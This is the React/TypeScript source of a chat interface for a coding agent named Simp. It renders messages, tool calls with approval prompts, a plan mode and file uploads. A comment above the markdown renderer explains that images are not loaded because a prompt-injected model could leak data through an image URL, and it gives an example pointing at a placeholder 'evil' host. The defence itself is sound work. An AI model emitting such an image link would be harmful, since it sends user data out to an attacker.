import "./chat.css";
import { type ReactNode, useEffect, useLayoutEffect, useRef, useState } from "react";
import Markdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import { api, AuthError, type ConnStatus } from "./api";
import { Badge } from "./App";
import {
  IconArrowDown, IconArrowUp, IconBell, IconCheck, IconChevron, IconCompact, IconCopy, IconDownload, IconFile, IconFolder, IconMore, IconPlan, IconPlus,
  IconStop,
} from "./icons";
import type { PendingApproval, ToolCall } from "./protocol.gen";
import { canContinue, type ChatState } from "./state";
import { PixelAgent } from "./PixelAgent";

interface Props {
  sid: string;
  state: ChatState;
  conn: ConnStatus;
  onError: (e: unknown) => void;
  onToggleFiles: () => void;
  filesOpen?: boolean;
  /** Open the Files panel at this file's folder, with the file highlighted. */
  onOpenFile?: (path: string) => void;
  notify: boolean;
  onToggleNotify: () => void;
  menuButton?: ReactNode;
  /** The first prompt sent from the home screen: shown at once until the server echoes it. */
  firstPrompt?: string;
}

interface Action { key: string; label: string; icon: ReactNode; title: string; onClick: () => void; pressed?: boolean; disabled?: boolean }

export function Chat({ sid, state, conn, onError, onToggleFiles, filesOpen = false, onOpenFile, notify, onToggleNotify, menuButton, firstPrompt }: Props) {
  const busy = state.runState !== "idle" && state.runState !== "error";
  const [cmdError, setCmdError] = useState<string>();
  useEffect(() => setCmdError(undefined), [sid]);
  // onError still sees every failure (AuthError logs out); non-auth ones are also shown above the composer.
  const fail = (e: unknown) => { onError(e); if (!(e instanceof AuthError)) setCmdError(errorText(e)); };
  const send = (c: Parameters<typeof api.command>[1]) => api.command(sid, c).then(() => setCmdError(undefined), fail);
  // Steer messages only reach state.items at the next turn boundary, so show them at once as pending bubbles.
  // A pending bubble hides once the server has echoed that text `n` times; leftovers are dropped when the run ends.
  const [steers, setSteers] = useState<{ id: number; text: string; n: number; failed?: boolean }[]>([]);
  const steerId = useRef(0);
  useEffect(() => setSteers([]), [sid]);
  useEffect(() => { if (!busy) setSteers((s) => s.filter((p) => p.failed)); }, [busy]);
  const echoed = (t: string) => state.items.filter((i) => i.kind === "user" && i.text === t).length;
  const pendingSteers = steers.filter((p) => p.failed || echoed(p.text) < p.n);
  const composerSend: Send = (c) => {
    if (c.type !== "steer") return void send(c);
    const id = ++steerId.current;
    setSteers((s) => [...s, { id, text: c.text, n: echoed(c.text) + s.filter((p) => p.text === c.text && !p.failed).length + 1 }]);
    api.command(sid, c).then(() => setCmdError(undefined), (e) => {
      fail(e);
      setSteers((s) => s.map((p) => (p.id === id ? { ...p, failed: true } : p)));
    });
  };
  const { inFlight: f } = state;
  const [spend, setSpend] = useState<Awaited<ReturnType<typeof api.usage>>>();
  useEffect(() => {  // on every run end, and every 30s so an admin pause/resume shows up while idle
    const load = () => api.usage().then(setSpend).catch(() => {});
    if (!busy) load();
    const t = setInterval(load, 30000);
    return () => clearInterval(t);
  }, [busy]);

  // Follow new output only while the user is at (or near) the bottom; otherwise offer a "scroll to bottom" button.
  const log = useRef<HTMLDivElement>(null);
  const stick = useRef(true);
  const [away, setAway] = useState(false);
  const seen = useRef(0);
  useEffect(() => { stick.current = true; setAway(false); seen.current = 0; }, [sid]);
  useLayoutEffect(() => {
    const el = log.current;
    if (!el) return;
    const n = state.items.length;
    if (n > seen.current && state.items[n - 1]?.kind === "user") stick.current = true;  // the user just sent something
    seen.current = n;
    if (stick.current) el.scrollTop = el.scrollHeight;
  }, [sid, state.items, f.text, f.thinking, state.toolOutputs, state.results, state.pending, steers]);
  const onScroll = () => {
    const el = log.current!;
    const near = el.scrollHeight - el.scrollTop - el.clientHeight < 80;
    stick.current = near;
    setAway(!near);
  };
  const toBottom = () => {
    const el = log.current!;
    stick.current = true;
    el.scrollTo({ top: el.scrollHeight, behavior: reducedMotion() ? "auto" : "smooth" });
  };

  const pendingShown = state.items.some((i) => i.kind === "assistant" && i.msg.tool_calls.some((c) => c.id === state.pending?.call_id));
  const actions: Action[] = [
    { key: "compact", label: "Compact", icon: <IconCompact size={16} />, disabled: busy,
      title: "Summarize older messages to free context", onClick: () => send({ type: "compact" }) },
    { key: "notify", label: "Notify when hidden", icon: <IconBell size={16} />, pressed: notify,
      title: "Notify me when this tab is hidden", onClick: onToggleNotify },
    { key: "files", label: "Files", icon: <IconFolder size={16} />, title: "Show files", pressed: filesOpen, onClick: onToggleFiles },
  ];

  return (
    <main className="chat">
      <header>
        {menuButton}
        <strong className="title">{state.title || sid}</strong>
        <Badge state={state.runState} />
        {conn !== "live" && <span className={`conn ${conn}`} role="status">{conn === "reconnecting" ? "reconnecting…" : "connecting…"}</span>}
        {spend && <span className="spend" title="Spent today">${spend.today_usd.toFixed(2)} / ${spend.day_limit_usd}{spend.paused && " · paused"}</span>}
        <span className="spacer" />
        <MoreMenu actions={actions} />
      </header>
      <div className="chat-body">
        <div className="messages" ref={log} onScroll={onScroll} role="log" aria-live="polite" aria-label="Conversation">
          <div className="thread">
            {state.items.map((it) =>
              it.kind === "user" ? <div key={it.seq} className="msg user">{it.text}</div>
              : it.kind === "notice" ? <div key={it.seq} className={`notice ${it.level}`}>{it.text}</div>
              : (
                <div key={it.seq} className="msg assistant">
                  {it.msg.thinking && <Thinking text={it.msg.thinking} />}
                  {it.msg.text && <Md text={it.msg.text} />}
                  {it.msg.error && <div className="notice error">{it.msg.error}</div>}
                  {it.msg.tool_calls.map((c) => <Tool key={c.id} call={c} state={state} send={send} sid={sid} onOpenFile={onOpenFile} onError={onError} />)}
                  {it.msg.text && <div className="msg-actions"><CopyButton text={() => it.msg.text} /></div>}
                </div>
              ))}
            {/* aria-live off + aria-busy: don't announce every streamed token; the finished message is announced once */}
            {firstPrompt && !state.items.some((i) => i.kind === "user") && <div className="msg user">{firstPrompt}</div>}
            {(() => {  // "working" indicator: from send until the first token, tool call or answer shows up
              const showFirst = !!firstPrompt && !state.items.some((i) => i.kind === "user");
              const lastUser = state.items[state.items.length - 1]?.kind === "user";
              return (busy || showFirst) && (lastUser || showFirst) && !f.text && !f.thinking && (
                <div className="msg assistant typing" role="status" aria-label="Simp is working">
                  <PixelAgent size={20} /><span className="dots" aria-hidden="true"><i /><i /><i /></span>
                </div>
              );
            })()}
            {(f.text || f.thinking) && (
              <div className="msg assistant streaming" aria-live="off" aria-busy="true">
                {f.thinking && <Thinking text={f.thinking} open />}
                {f.text && <Md text={f.text} />}
              </div>
            )}
            {pendingSteers.map((p) => (
              <div key={`steer-${p.id}`} className={`msg user pending ${p.failed ? "failed" : ""}`}>
                {p.text}<span className="msg-status">{p.failed ? "Not sent" : "Pending"}</span>
              </div>
            ))}
            {state.pending && !pendingShown && <Approval p={state.pending} send={send} />}
            {canContinue(state) && (
              <div className="row"><button className="primary" onClick={() => send({ type: "continue" })}>Continue</button></div>
            )}
          </div>
        </div>
        {away && (
          <button className="to-bottom" aria-label="Scroll to bottom" title="Scroll to bottom" onClick={toBottom}>
            <IconArrowDown size={16} />
          </button>
        )}
      </div>
      {cmdError && <div className="notice error cmd-error" role="alert">{cmdError}</div>}
      <Composer busy={busy} send={composerSend} sid={sid} onError={onError} planMode={state.planMode}
        onTogglePlan={() => send({ type: "set_plan_mode", enabled: !state.planMode })} />
    </main>
  );
}

const reducedMotion = () => typeof matchMedia === "function" && matchMedia("(prefers-reduced-motion: reduce)").matches;

/** Session actions (Compact, Notify, Files) behind the header's "⋯" button, on every screen size. */
function MoreMenu({ actions }: { actions: Action[] }) {
  const [open, setOpen] = useState(false);
  const root = useRef<HTMLDivElement>(null);
  const trigger = useRef<HTMLButtonElement>(null);
  const items = () => [...(root.current?.querySelectorAll<HTMLButtonElement>("[role^=menuitem]") ?? [])];
  useEffect(() => {
    if (!open) return;
    items()[0]?.focus();
    const away = (e: PointerEvent) => { if (!root.current?.contains(e.target as Node)) setOpen(false); };
    document.addEventListener("pointerdown", away);
    return () => document.removeEventListener("pointerdown", away);
  }, [open]);
  const close = () => { setOpen(false); trigger.current?.focus(); };
  const onKey = (e: React.KeyboardEvent) => {
    if (e.key === "Escape") { e.stopPropagation(); close(); return; }
    if (e.key !== "ArrowDown" && e.key !== "ArrowUp" && e.key !== "Home" && e.key !== "End") return;
    e.preventDefault();
    const list = items();
    const i = list.indexOf(document.activeElement as HTMLButtonElement);
    const next = e.key === "Home" ? 0 : e.key === "End" ? list.length - 1
      : (i + (e.key === "ArrowDown" ? 1 : -1) + list.length) % list.length;
    list[next]?.focus();
  };
  return (
    <div className="more" ref={root} onKeyDown={onKey}
      onBlur={(e) => { if (open && !root.current?.contains(e.relatedTarget as Node)) setOpen(false); }}>
      <button ref={trigger} className="hbtn" aria-label="More" title="More" aria-haspopup="menu" aria-expanded={open}
        onClick={() => setOpen(!open)}>
        <IconMore size={16} />
      </button>
      {open && (
        <div className="menu" role="menu" aria-label="Session actions">
          {actions.map((a) => (
            <button key={a.key} role={a.pressed === undefined ? "menuitem" : "menuitemcheckbox"} aria-checked={a.pressed}
              aria-disabled={a.disabled || undefined} title={a.title} tabIndex={-1}
              onClick={() => { if (a.disabled) return; a.onClick(); close(); }}>
              {a.icon}<span>{a.label}</span>
              {a.pressed && <IconCheck size={16} className="check" />}
            </button>
          ))}
        </div>
      )}
    </div>
  );
}

function useCopy(): [boolean, (t: string) => void] {
  const [done, setDone] = useState(false);
  const timer = useRef<number>(undefined);
  useEffect(() => () => clearTimeout(timer.current), []);
  const copy = (t: string) => navigator.clipboard?.writeText(t).then(() => {
    setDone(true);
    clearTimeout(timer.current);
    timer.current = window.setTimeout(() => setDone(false), 1500);
  }, () => {});
  return [done, copy];
}

function CopyButton({ text, label = "Copy", className = "icon-btn" }: { text: () => string; label?: string; className?: string }) {
  const [done, copy] = useCopy();
  return (
    <button type="button" className={className} aria-label={done ? "Copied" : label} title={done ? "Copied" : label}
      onClick={() => copy(text())}>
      {done ? <IconCheck size={16} /> : <IconCopy size={16} />}
    </button>
  );
}

function CodeBlock({ children }: { children?: ReactNode }) {
  const pre = useRef<HTMLPreElement>(null);
  return (
    <div className="code-block">
      <pre ref={pre}>{children}</pre>
      <CopyButton text={() => pre.current?.textContent ?? ""} label="Copy code" className="icon-btn code-copy" />
    </div>
  );
}

// Images are never loaded: a prompt-injected model could leak data via ![](https://evil/?d=...). javascript: URLs are
// dropped by react-markdown's default urlTransform.
const mdComponents: Components = {
  img: ({ src, alt }) => <a href={typeof src === "string" ? src : undefined} target="_blank" rel="noopener noreferrer">[image: {alt}] {src}</a>,
  a: ({ href, children }) => <a href={href} target="_blank" rel="noopener noreferrer">{children}</a>,
  pre: ({ children }) => <CodeBlock>{children}</CodeBlock>,
};
export const Md = ({ text }: { text: string }) => <div className="md"><Markdown remarkPlugins={[remarkGfm]} components={mdComponents}>{text}</Markdown></div>;

function Thinking({ text, open }: { text: string; open?: boolean }) {
  return (
    <details className="thinking" open={open}>
      <summary><IconChevron size={16} className="chev" />Thinking</summary>
      <div>{text}</div>
    </details>
  );
}

export type Send = (c: Parameters<typeof api.command>[1]) => void;

/** Tools that write a file; their `path` argument names it (see simp_agent/coding/tools.py). */
const FILE_TOOLS = new Set(["write", "edit"]);

/** The file a tool call wrote, once its result came back without error; otherwise undefined. */
export function writtenFile(call: ToolCall, result?: { is_error: boolean }): string | undefined {
  const path = call.arguments.path;
  return FILE_TOOLS.has(call.name) && result && !result.is_error && typeof path === "string" && path ? path : undefined;
}

export async function downloadFile(sid: string, path: string) {
  const url = URL.createObjectURL(await api.download(sid, path));
  Object.assign(document.createElement("a"), { href: url, download: path.split("/").pop() || path }).click();
  URL.revokeObjectURL(url);
}

function FileCard({ path, sid, onOpen, onError }: { path: string; sid: string; onOpen?: (p: string) => void; onError: (e: unknown) => void }) {
  return (
    <div className="file-card">
      <IconFile size={16} />
      <span className="file-path" title={path}>{path}</span>
      {onOpen && <button type="button" className="hbtn" aria-label={`Open ${path} in Files`} onClick={() => onOpen(path)}>
        <IconFolder size={16} /><span>Open</span></button>}
      <button type="button" className="hbtn" aria-label={`Download ${path}`}
        onClick={() => downloadFile(sid, path).catch(onError)}><IconDownload size={16} /><span>Download</span></button>
    </div>
  );
}

function Tool({ call, state, send, sid, onOpenFile, onError }: {
  call: ToolCall; state: ChatState; send: Send; sid: string; onOpenFile?: (p: string) => void; onError: (e: unknown) => void;
}) {
  const result = state.results[call.id];
  const output = result?.content ?? state.toolOutputs[call.id];
  const decision = state.decisions[call.id];
  const file = writtenFile(call, result);
  const status = result ? (result.is_error ? "error" : "done") : state.pending?.call_id === call.id ? "approval" : "running";
  return (
    <>
    <details className={`tool ${status}`} open={status !== "done"}>
      <summary>
        <span className={`dot ${status}`} title={dotLabel[status]} role="img" aria-label={dotLabel[status]} />
        <span className="tool-name">{call.name}</span>
        <code className="tool-args">{summarize(call.arguments)}</code>
        <IconChevron size={16} className="chev" />
      </summary>
      <div className="tool-body">
        <pre className="args">{JSON.stringify(call.arguments, null, 2)}</pre>
        {state.pending?.call_id === call.id && <Approval p={state.pending} send={send} inline />}
        {decision && decision !== "allow" && <p className="small muted">Decision: {decision}</p>}
        {output && <pre className={`output ${result?.is_error ? "err" : ""}`}>{output}</pre>}
      </div>
    </details>
    {file && <FileCard path={file} sid={sid} onOpen={onOpenFile} onError={onError} />}
    </>
  );
}

const dotLabel = { running: "running", done: "done", error: "error", approval: "needs approval" } as const;

/** "409 {\"detail\":\"...\"}" (from api.call) -> the server's detail text when there is one. */
export function errorText(e: unknown): string {
  const m = e instanceof Error ? e.message : String(e);
  const i = m.indexOf(" ");
  try {
    const d = JSON.parse(m.slice(i + 1)).detail;
    if (typeof d === "string") return d;
  } catch { /* not JSON */ }
  return m;
}

function summarize(args: Record<string, unknown>): string {
  const v = Object.values(args)[0];
  return typeof v === "string" ? v.split("\n")[0] : JSON.stringify(args);
}

function Approval({ p, send, inline }: { p: PendingApproval; send: Send; inline?: boolean }) {
  const answer = (decision: "allow" | "deny" | "always") => send({ type: "approve", call_id: p.call_id, decision });
  // No autoFocus on Allow: an Enter meant for the composer would approve the tool. We focus the card itself (a
  // non-actionable element, so a stray Enter does nothing) and only when the user isn't typing somewhere.
  const card = useRef<HTMLDivElement>(null);
  useEffect(() => {
    const a = document.activeElement;
    if (!(a instanceof HTMLTextAreaElement || a instanceof HTMLInputElement)) card.current?.focus({ preventScroll: true });
  }, [p.call_id]);
  return (
    <div ref={card} tabIndex={-1} className="approval-card" role="alertdialog" aria-label="Approval needed">
      <p><strong>Allow {p.tool}?</strong></p>
      {!inline && <pre className="args">{JSON.stringify(p.args, null, 2)}</pre>}
      <div className="row">
        <button className="primary" onClick={() => answer("allow")}>Allow</button>
        <button onClick={() => answer("always")}>Always</button>
        <button className="danger" onClick={() => answer("deny")}>Deny</button>
      </div>
    </div>
  );
}

export function Composer({ busy, send, variant, disabled, tools, sid, onError, planMode, onTogglePlan, onQueueFiles }: {
  busy: boolean; send: Send; variant?: "hero"; disabled?: boolean; tools?: ReactNode;
  /** In a session: the Plan toggle chip. */
  planMode?: boolean; onTogglePlan?: () => void;
  /** With a session: show the attach button; files go to the workspace root (same as the Files panel). */
  sid?: string; onError?: (e: unknown) => void;
  /** No session yet (home): keep picked files; the caller uploads them once the session exists. */
  onQueueFiles?: (files: File[]) => void;
}) {
  const [text, setText] = useState("");
  const [attached, setAttached] = useState<string[]>([]);
  const [uploading, setUploading] = useState(false);
  const area = useRef<HTMLTextAreaElement>(null);
  const picker = useRef<HTMLInputElement>(null);
  useEffect(() => setAttached([]), [sid]);
  useLayoutEffect(() => {  // grow with the text; CSS max-height caps it and the rest scrolls
    const el = area.current;
    if (!el) return;
    el.style.height = "auto";
    el.style.height = `${el.scrollHeight}px`;
  }, [text]);
  const empty = !text.trim();
  const submit = () => {
    const t = text.trim();
    if (!t || disabled) return;
    const note = attached.length ? `\n\n[Attached files in the workspace: ${attached.join(", ")}]` : "";  // so the agent knows
    send(!busy ? { type: "prompt", text: t + note } : { type: "steer", text: t + note });
    setText("");
    setAttached([]);
  };
  const stop = () => send({ type: "abort" });
  const upload = async (files: FileList | null) => {
    if (!files?.length) return;
    if (!sid) {  // home: nothing to upload to yet
      const list = [...files];
      onQueueFiles?.(list);
      setAttached((a) => [...a, ...list.map((f) => f.name).filter((n) => !a.includes(n))]);
      if (picker.current) picker.current.value = "";
      return;
    }
    setUploading(true);
    try {
      for (const f of files) {
        await api.upload(sid, f.name, f);
        setAttached((a) => (a.includes(f.name) ? a : [...a, f.name]));
      }
    } catch (e) { onError?.(e); } finally {
      setUploading(false);
      if (picker.current) picker.current.value = "";
    }
  };
  return (
    <div className={`composer ${variant ?? ""}`}>
      <div className="composer-card" onClick={(e) => { if (e.target === e.currentTarget) area.current?.focus(); }}>
        {(attached.length > 0 || uploading) && (
          <ul className="attached" aria-label="Attached files" aria-live="polite">
            {attached.map((n) => <li key={n} title={`Uploaded to the workspace: ${n}`}>{n}</li>)}
            {uploading && <li className="muted">Uploading…</li>}
          </ul>
        )}
        <textarea
          ref={area} value={text} rows={1} autoFocus aria-label="Message" disabled={disabled}
          placeholder={busy ? "Steer the running agent…" : "Message Simp…"}
          onChange={(e) => setText(e.target.value)}
          onKeyDown={(e) => {
            if (e.key === "Enter" && !e.shiftKey && !e.nativeEvent.isComposing) { e.preventDefault(); submit(); }
            if (e.key === "Escape" && busy) stop();
          }}
        />
        <div className="composer-bar">
          <span className="spacer" />
          {tools}
          {(sid || onQueueFiles) && (
            <>
              <button type="button" className="round attach" aria-label="Attach files" title="Attach files"
                disabled={uploading} onClick={() => picker.current?.click()}><IconPlus size={16} /></button>
              <input ref={picker} type="file" multiple hidden onChange={(e) => upload(e.target.files)} />
            </>
          )}
          {busy && empty ? (
            <button type="button" className="round stop" aria-label="Stop" title="Stop (Esc)" onClick={stop}><IconStop size={16} /></button>
          ) : (
            <button type="button" className="round send" aria-label={busy ? "Steer" : "Send"}
              title={busy ? "Steer" : "Send"} disabled={empty || disabled} onClick={submit}>
              <IconArrowUp size={16} />
            </button>
          )}
        </div>
      </div>
      {onTogglePlan && (
        <div className="composer-modes" role="group" aria-label="Modes">
          <button type="button" className={`chip plan ${planMode ? "on" : ""}`} aria-pressed={!!planMode} onClick={onTogglePlan}
            title="Plan mode: read-only, the agent plans but does not edit or run commands">
            <IconPlan size={14} /><span>Plan</span>
          </button>
        </div>
      )}
    </div>
  );
}
